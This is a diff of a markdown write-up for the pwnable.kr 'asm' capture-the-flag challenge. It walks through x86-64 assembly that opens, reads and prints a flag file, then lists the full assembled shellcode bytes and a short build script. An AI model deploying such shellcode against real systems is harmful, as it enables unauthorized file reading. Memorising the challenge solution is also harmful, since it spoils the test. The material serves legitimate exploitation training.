@@ -114,7 +114,7 @@ Note this is not the most practical option as tools like pwntools.asm exist, but
 good practice in asm.
 
 Our `payload.asm` file:
-```
+```asm
 ;Author: Weston Silbaugh
 ;the asm for our shellcode payload
 	section .mysec write exec alloc
@@ -166,18 +166,18 @@ nullchar:
 Normally we would want to make this payload smaller but with the generous `0x1000` its good enough.
 
 ###Walkthrough of `payload.asm`:
-```
+```asm
 	section .mysec write exec alloc
 	global	main
 ```
 I make my own secton to allow it to be set to write. Its not needed in this asm but non the less its there
-```
+```asm
 main:
 	jmp		push_fname
 s1:
 ```
 Then we jump to push_fname which pushes the flags file name to the stack and jumps back to `s1`
-```
+```asm
 push_fname:
 	call	s1
 fname:
@@ -190,7 +190,7 @@ The call to s1 pushes the address of our string onto the stack and jumps back to
 The string is placed at the bottom of .mysec because if it was at the top, a near jump call would contain NULL characters.
 Making our string null terminated will have the same issue so it is left as an `a` character for now and will be changed at
 run time.
-```
+```asm
 ;add null char
 	xor		rax, rax
 	pop		rbx
@@ -201,7 +201,7 @@ run time.
 Once we return to `s1:`, our string is null terminated.
 
 Then the flag is opened for reading.
-```
+```asm
 ;open:
 	add		al, 0x02	;sys_open
 	pop		rdi		;const char *fname
@@ -213,7 +213,7 @@ Then the flag is opened for reading.
 The filename string is on the stack so we simply pop it off into `RBX`
 
 Then we read the flag
-```
+```asm
 ;read:
 	mov		rdi, rax	;int fd
 	xor		rax, rax	;sys_read
@@ -225,7 +225,7 @@ Then we read the flag
 The string holding the filename is overwriten with the contents of the flag.
 
 And write the flags contents out to stdout.
-```
+```asm
 ;write:
 	xor		eax, eax
 	add 		al, 0x01	;sys_read
@@ -237,8 +237,8 @@ And write the flags contents out to stdout.
 ```
 The string size is still in `rdx`.
 
-Then exit the program
-```
+Then exit the program.
+```asm
 exit:
 	xor		rax, rax
 	xor		rdi, rdi
@@ -246,6 +246,11 @@ exit:
 	syscall
 ```
 ###converting `payload.asm` into shellcode
+my script to build `payload.asm`
+```
+nasm -felf64 ${1}.asm
+gcc ${1}.o -o ${1}
+```
 compile the shellcode `$ sh build.sh payload`
 
 running `objdump -d` we can see the opcodes and addresses of those opcodes in the elf.
@@ -254,13 +259,13 @@ running `objdump -d` we can see the opcodes and addresses of those opcodes in th
 convert all the opcodes into shellcode and we are done.
 
 I wrote a small python script just for this purpose.
-```
+```asm
 objdump -d payload | mkshell -x 600870 6009ad
 \xeb\x40\x48\x31\xc0\x5b\x53\x66\x81\xc3\xe7\x00\x67\x89\x03\x04\x02\x5f\x57\x48\x31\xf6\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x5e\x56\x66\x81\xc2\x90\x01\x0f\x05\x31\xc0\x04\x01\x48\x31\xff\x48\x83\xc7\x01\x5e\x0f\x05\x48\x31\xc0\x48\x31\xff\x04\x3c\x0f\x05\xe8\xbb\xff\xff\xff\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x2f\x61\x73\x6d\x2f\x74\x68\x69\x73\x5f\x69\x73\x5f\x70\x77\x6e\x61\x62\x6c\x65\x2e\x6b\x72\x5f\x66\x6c\x61\x67\x5f\x66\x69\x6c\x65\x5f\x70\x6c\x65\x61\x73\x65\x5f\x72\x65\x61\x64\x5f\x74\x68\x69\x73\x5f\x66\x69\x6c\x65\x2e\x73\x6f\x72\x72\x79\x5f\x74\x68\x65\x5f\x66\x69\x6c\x65\x5f\x6e\x61\x6d\x65\x5f\x69\x73\x5f\x76\x65\x72\x79\x5f\x6c\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x6f\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x30\x6f\x6e\x67\x61\x61
 ```
 ###Sending the shellcode
 All thats left now is to send the shellcode to `asm` at `asm@pwnable.kr`
-```
+```asm
 """
 pwnable.kr-asm solution
 author: Weston Silbaugh
